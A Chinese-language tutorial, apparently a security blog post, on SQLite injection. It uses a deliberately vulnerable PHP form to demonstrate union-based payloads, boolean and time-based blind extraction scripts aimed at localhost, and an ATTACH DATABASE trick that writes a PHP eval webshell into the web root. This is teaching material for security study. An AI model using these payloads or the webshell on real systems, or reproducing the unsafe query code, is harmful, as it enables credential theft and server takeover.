SQLite 是一个进程内的库，实现了自给自足的、无服务器的、零配置的、事务性的 SQL
数据库引擎。它是一个零配置的数据库，这意味着与其他数据库不一样，你不需要在系统中配置。
SQLite数据库的特点是它每一个数据库都是一个文件，当你查询表的完整信息时会得到创建表的语句，基本和mysql差不多。

# SQLite语法

这里对SQLite语法进行简单介绍，详情可看Sqlite语法教程：<https://www.runoob.com/sqlite/sqlite-tutorial.html>

 **相关命令**

    
    
    .help   获取可用的点命令的清单  
    .show   显示各种设置的当前值  
    .quite 退出SQLite 提示符  
    .databases 列出数据库的名称及其所依附的文件  
    .schema ?TABLE? 显示 CREATE 语句,例如.schema sqlite_master

 **数据库操作**

SQLite 的 sqlite3 命令被用来创建新的 SQLite 数据库。您不需要任何特殊的权限即可创建一个数据。 另外我们也可以使用 .open
来建立新的数据库文件：

    
    
    ➜ sqlite3 dbname.db  
    SQLite version 3.32.3 2020-06-18 14:16:19  
    Enter ".help" for usage hints.  
    sqlite> .databases  
    main: /Users/ye1s/Desktop/work/dbname.db  
    sqlite> .open test.db

SQLite可以附加数据库，假设这样一种情况，当在同一时间有多个数据库可用，您想使用其中的任何一个。SQLite 的 ATTACH DATABASE
语句是用来选择一个特定的数据库。

例如想附加一个数据库 testDB.db。

    
    
    sqlite> ATTACH DATABASE 'testDB.db' as 'TEST';  
    sqlite> .databases  
    main: /Users/ye1s/Desktop/work/dbname.db  
    TEST: /Users/ye1s/Desktop/work/testDB.db

 **表操作**

CREATE TABLE 语句用来创建一个新表，.tables查看创建的表， .schema 可查看表的完整信息，INSERT INTO
向表中添加信息，drop table 删除表。

    
    
    sqlite> CREATE TABLE USERS(  
     ...>   ID INT PRIMARY KEY     NOT NULL,  
     ...>   USERNAME           TEXT    NOT NULL,  
     ...>    PASSWORD           TEXT     NOT NULL  
     ...> );  
    sqlite> .tables  
    USERS  
    sqlite> .schema users  
    CREATE TABLE USERS(  
     ID INT PRIMARY KEY     NOT NULL,  
     USERNAME           TEXT    NOT NULL,  
     PASSWORD           TEXT    NOT NULL  
    );  
    ​  
    sqlite> INSERT INTO users (id,username,password) VALUES (1, 'admin', 'password');  
    ​  
    sqlite> select * from users;  
    1|admin|password  
    ​  
    sqlite> .header on  
    sqlite> .mode column  
    sqlite> select * from users;  
    ID         USERNAME    PASSWORD    
    ----------  ----------  ----------  
    1           admin       password    
    ​  
    sqlite> drop table users;  
    sqlite> .tables

# SQLite注入

以如下代码为例，进行介绍

    
    
    <html>  
    <body>  
    <form action="" method="POST">  
      <input type="text" name="id" size="80">  
      <input type="submit">  
    </form>  
    </body>  
    </html>  
    ​  
    <?php  
    class MyDB extends SQLite3  
    {  
      function __construct()  
     {  
          $this->open('dbname.db');  
     }  
    }  
    $db = new MyDB();  
    if(!$db){  
      echo $db->lastErrorMsg();  
    } else {  
      echo "You can query users by ID.\n</br>";  
    }  
    ​  
    $id = $_POST['id'];  
    $sql =<<<EOF  
        SELECT * from users where id='$id';  
    EOF;  
    $ret = $db->query($sql);  
    if($ret==false){  
      echo "Error in fetch ".$db->lastErrorMsg();  
    }  
    else{  
      while($row = $ret->fetchArray(SQLITE3_ASSOC) ){  
          echo "ID = ". $row['ID'] . "</br>";  
          echo "Username = ". $row['USERNAME'] ."</br>";  
          echo "Password = ". $row['PASSWORD'] ."</br>";  
     }  
      var_dump($ret->fetchArray(SQLITE3_ASSOC));  
    }  
    ​  
    $db->close();  
    ?>

SQLite语句

    
    
    sqlite3 dbname.db  
    CREATE TABLE USERS(  
     ID INT PRIMARY KEY     NOT NULL,  
     USERNAME           TEXT    NOT NULL,  
     PASSWORD           TEXT    NOT NULL  
    );  
    ​  
    INSERT INTO users (id,username,password) VALUES (1, 'admin', 'password');  
    INSERT INTO users (id,username,password) VALUES (2, 'test', 'test');

SQLite相关注意点：

1.SQLite_master:这个是内置系统表、相当于mysql的information_schema，但是这里只存有表的信息，里面有个sql字段，有各个表的结构，有表名，字段名和类型。

2.SQLite并不支持像mysql那样的注释，但是可以通过 - 方式增加DDL注释(写shell会用到)SQL，并扩展至下一个换行符（ASCII
0x0a）或直到输入结束，以先到者为准。您也可以使用 C 风格的注释，以 `/*`开始，并扩展至下一个
`*/`字符对或直到输入结束，以先到者为准。SQLite的注释可以跨越多行。

## 联合查询

输入1' ，发现报错，说明当前闭合方式为单引号。

闭合SQL语句

    
    
    1';  
    1' --   
    1' /*

![1647310513_622ff6b15e73a6f0211ff.png!small?1647310512991](https://image.3001.net/images/20220315/1647310513_622ff6b15e73a6f0211ff.png!small?1647310512991)

order by确定字段数

    
    
    1' order by 5 --
![1647310498_622ff6a2787bf5677810a.png!small?1647310512992](https://image.3001.net/images/20220315/1647310498_622ff6a2787bf5677810a.png!small?1647310512992)

判断回显位

    
    
    -1' union select 1,2,3 --
![1647310504_622ff6a8da6484ba96ba6.png!small?1647310512990](https://image.3001.net/images/20220315/1647310504_622ff6a8da6484ba96ba6.png!small?1647310512990)

查看版本

    
    
    -1' union select 1,2,sqlite_version() --
查询表名和列名，这里直接通过查询 sqlite_master 表。

    
    
    -1' union select 1, (select sql from sqlite_master) ,3--
查询数据

    
    
    -1' union select 1, (select group_concat(USERNAME,PASSWORD) from users) ,3--
## 布尔盲注

布尔盲注通过查询正确和错误返回的页面不同来判断数据内容。
SQLite不支持ascii，所以直接通过字符去查询，这里和mysql不同，这个区分大小写。也没有mid,left等函数。

语句执行正确时，页面返回的信息

    
    
    -1' or substr((select group_concat(sql) from sqlite_master),1,1)<'a'/*

![1647310534_622ff6c6d6811505c67b5.png!small?1647310548311](https://image.3001.net/images/20220315/1647310534_622ff6c6d6811505c67b5.png!small?1647310548311)

语句执行错误时，页面返回的信息

    
    
    -1' or substr((select group_concat(sql) from sqlite_master),1,1)>'a'/*

![1647310542_622ff6ce571d3539b272e.png!small?1647310548314](https://image.3001.net/images/20220315/1647310542_622ff6ce571d3539b272e.png!small?1647310548314)

注入脚本

    
    
    import requests  
    url = 'http://localhost:9000/index.php'  
    flag = ''  
    for i in range(1,500):  
     low = 32  
     high = 128  
     mid = (low+high)//2  
     while(low<high):  
         payload = "-1' or substr((select hex(group_concat(sql)) from sqlite_master),{0},1)>'{1}'/*".format(i,chr(mid))  
         datas = {  
             "id": payload  
         }  
         res = requests.post(url=url,data=datas)  
    ​  
         if 'Username' in res.text:  
             low = mid+1  
         else:  
             high = mid  
         mid = (low+high)//2  
     if(mid ==32 or mid ==127):  
         break  
     flag = flag+chr(mid)  
     print(flag)  
    ​  
    print('\n'+bytes.fromhex(flag).decode('utf-8'))

## 时间盲注

SQLite没有sleep()函数，但可以用randomblob(N)函数，randomblob(N) 函数，其作用是返回一个 N 字节长的包含伪随机字节的
BLOG。 N 是正整数。可以用它来制造延时。SQLite没有if，所以需要使用case……when来代替。

    
    
    -1' or (case when(substr(sqlite_version(),1,1)>'3') then randomblob(300000000) else 0 end)/*

注入脚本

    
    
    import requests  
    import time  
    url = 'http://localhost:9000/index.php'  
    flag = ''  
    for i in range(1,500):  
     low = 32  
     high = 128  
     mid = (low+high)//2  
     while(low<high):  
         payload = "-1' or (case when(substr((select hex(group_concat(sql)) from sqlite_master),{0},1)>'{1}') then randomblob(300000000) else 0 end)/*".format(i,chr(mid))  
         datas = {  
             "id": payload  
         }  
         start_time=time.time()  
         res = requests.post(url=url,data=datas)  
         end_time=time.time()  
         spend_time=end_time-start_time  
         if spend_time>=2:  
             low = mid+1  
         else:  
             high = mid  
         mid = (low+high)//2  
     if(mid ==32 or mid ==127):  
         break  
     flag = flag+chr(mid)  
     print(flag)  
    ​  
    print('\n'+bytes.fromhex(flag).decode('utf-8'))

## 写webshell

SQLite 的 ATTACH DATABASE 语句是用来选择一个特定的数据库，使用该命令后，所有的 SQLite 语句将在附加的数据库下执行。

    
    
    ATTACH DATABASE file_name AS database_name;

如果附加数据库不存在，就会创建该数据库，如果数据库文件设置在web目录下，就可以写入webshell。

    
    
    ATTACH DATABASE '/var/www/html/shell.php' AS shell;  
    create TABLE shell.exp (webshell text);   
    insert INTO shell.exp (webshell) VALUES ('<?php eval($_POST[a]);?>');

示例代码使用的是 query() 函数来执行 SQL 语句，此时无法执行分号隔离的多条语句。可以将 query() 换成
exec()，可造成堆叠注入，就可以写 Webshell 了，exec()函数执行后没有回显。执行如下语句：

    
    
    1';ATTACH DATABASE '/var/www/html/shell.php' AS shell;  
    create TABLE shell.exp (webshell text);   
    insert INTO shell.exp (webshell) VALUES ('<?php eval($_POST[a]);?>'); /*

参考文章：

[文库 |
Sqlite注入基础](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247505363&idx=1&sn=96744239fcc8318be51259a38514bd41)[SQLite
数据库注入总结](https://xz.aliyun.com/t/10308)

